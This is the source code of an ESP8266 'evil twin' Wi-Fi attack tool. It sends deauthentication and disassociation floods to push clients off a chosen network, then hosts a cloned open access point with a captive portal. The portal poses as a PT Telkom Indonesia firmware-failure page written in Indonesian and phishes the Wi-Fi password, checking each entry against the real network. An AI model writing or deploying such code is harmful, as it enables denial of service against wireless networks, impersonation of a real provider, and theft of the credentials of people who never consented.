#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
} _Network;

typedef struct {
  uint8_t mac[6];
} _Client;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[20];
_Network _selectedNetwork;
_Client _clients[20];
int _clientCount = 0;

String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool client_scan_active = false;

// Deauthentication settings
unsigned long deauth_interval = 100; // ms between deauth bursts
unsigned long client_scan_interval = 5000; // ms between client scans
unsigned long last_deauth = 0;
unsigned long last_client_scan = 0;

// Default main strings
#define SUBTITLE "ACCESS POINT RESTRICTED MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Router Anda mengalami masalah saat menginstal pembaruan firmware terbaru secara otomatis.<br><br>Untuk mengembalikan firmware lama dan memperbarui secara manual, harap verifikasi kata sandi Anda."

// ==================== UTILITY FUNCTIONS ====================
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void strToBytes(String str, uint8_t* bytes) {
  for (int i = 0; i < 6; i++) {
    bytes[i] = (uint8_t) strtoul(str.substring(i*3, i*3+2).c_str(), NULL, 16);
  }
}

// ==================== DEAUTH FUNCTIONS ====================
void sendDeauth(uint8_t* bssid, uint8_t* target, uint8_t reason) {
  // Deauth packet template
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Type, subtype: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    reason, 0x00                        // Reason code
  };

  // Set MAC addresses
  memcpy(&deauthPacket[4], target, 6);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);

  // Send packet
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
}

void sendDisassoc(uint8_t* bssid, uint8_t* target, uint8_t reason) {
  // Disassoc packet template
  uint8_t disassocPacket[26] = {
    0xA0, 0x00,                         // Type, subtype: Disassoc
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    reason, 0x00                        // Reason code
  };

  // Set MAC addresses
  memcpy(&disassocPacket[4], target, 6);
  memcpy(&disassocPacket[10], bssid, 6);
  memcpy(&disassocPacket[16], bssid, 6);

  // Send packet
  wifi_send_pkt_freedom(disassocPacket, 26, 0);
}

void deauthAll() {
  if (!deauthing_active || _selectedNetwork.ssid == "") return;

  // Set to correct channel
  wifi_set_channel(_selectedNetwork.ch);

  // Broadcast deauth to all devices
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  sendDeauth(_selectedNetwork.bssid, broadcast, 0x01);
  sendDisassoc(_selectedNetwork.bssid, broadcast, 0x01);

  // Deauth all known clients
  for (int i = 0; i < _clientCount; i++) {
    sendDeauth(_selectedNetwork.bssid, _clients[i].mac, 0x01);
    sendDisassoc(_selectedNetwork.bssid, _clients[i].mac, 0x01);
    delay(1);
  }
}

// ==================== CLIENT SCANNING ====================
void scanClients() {
  if (!client_scan_active || _selectedNetwork.ssid == "") return;

  wifi_set_channel(_selectedNetwork.ch);
  wifi_promiscuous_enable(1);
  
  // Simple client detection - in real implementation you'd use promiscuous callback
  // This is just a placeholder
  _clientCount = 0;
  // In a real implementation, you'd capture packets to identify clients
}

// ==================== NETWORK SCANNING ====================
void performScan() {
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < 20; i++) {
    _networks[i].ssid = "";
  }
  
  if (n > 0) {
    for (int i = 0; i < n && i < 20; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      memcpy(network.bssid, WiFi.BSSID(i), 6);
      _networks[i] = network;
    }
  }
}

// ==================== WEB SERVER ====================
String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #b90505; padding: 1.3em; }"
               "body { background: #b90505; color: #ffffff; font-weight: bold; font-family: Century Gothic, sans-serif; font-size: 17.1px; line-height: 25px; margin: 0; padding: 0; }"
               "div { color: #ffffff; padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #000000; justify-content: center; display: flex; font-style: normal; font-weight: bold; }"
               "nav { background: #000000; color: #ffffff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; 2025 PT Telkom Indonesia (Persero) Tbk.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>Silahkan Masukan Kembali Password Wifi</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 20; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        scanClients();
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "start");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
    } else {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("bl4nk", "dappogamtenk");
      dnsServer.start(DNS_PORT, "*", apIP);
    }
  }

  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
    } else {
      webServer.send(200, "text/html", index());
    }
  } else {
    String html = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                 "<style>.content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                 "</head><body><div class='content'>"
                 "<div><form style='display:inline-block;' method='post' action='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>"
                 "<button style='display:inline-block;'" + String(_selectedNetwork.ssid == "" ? " disabled" : "") + ">" + String(deauthing_active ? "Stop Deauth" : "Start Deauth") + "</button></form>"
                 "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot=" + String(hotspot_active ? "stop" : "start") + "'>"
                 "<button style='display:inline-block;'" + String(_selectedNetwork.ssid == "" ? " disabled" : "") + ">" + String(hotspot_active ? "Stop EvilTwin" : "Start EvilTwin") + "</button></form>"
                 "</div><br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Select</th></tr>";

    for (int i = 0; i < 20; ++i) {
      if (_networks[i].ssid == "") continue;
      html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].rssi) + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      html += bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6) ? 
              "<button style='background-color: #b90505;'>Selected</button></form></td></tr>" : 
              "<button>Select</button></form></td></tr>";
    }

    html += "</table>";
    if (_correct != "") html += "<br><h3>" + _correct + "</h3>";
    html += "</div></body></html>";
    webServer.send(200, "text/html", html);
  }
}

void handleResult() {
  if (WiFi.status() == WL_CONNECTED) {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("bl4nk", "dappogamtenk");
    dnsServer.start(DNS_PORT, "*", apIP);
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><correct style='text-shadow: 1px 1px black;color:green;font-size:60px;width:60px;height:60px'>&#10003;</correct><br>Verification Successful</h2><p>Your device will now reconnect.</p></center></body> </html>");
  } else {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please try again.</p></center></body> </html>");
  }
}

// ==================== MAIN SETUP/LOOP ====================
void setup() {
  Serial.begin(115200);
  
  // Setup WiFi
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  // Setup AP
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("bl4nk", "dappogamtenk");
  dnsServer.start(DNS_PORT, "*", apIP);

  // Setup web server
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  // Initial scan
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauth at regular intervals
  if (deauthing_active && millis() - last_deauth >= deauth_interval) {
    deauthAll();
    last_deauth = millis();
  }

  // Scan for clients periodically
  if (millis() - last_client_scan >= client_scan_interval) {
    scanClients();
    last_client_scan = millis();
  }

  // Rescan networks every 15 seconds
  static unsigned long last_scan = 0;
  if (millis() - last_scan >= 15000) {
    performScan();
    last_scan = millis();
  }
}
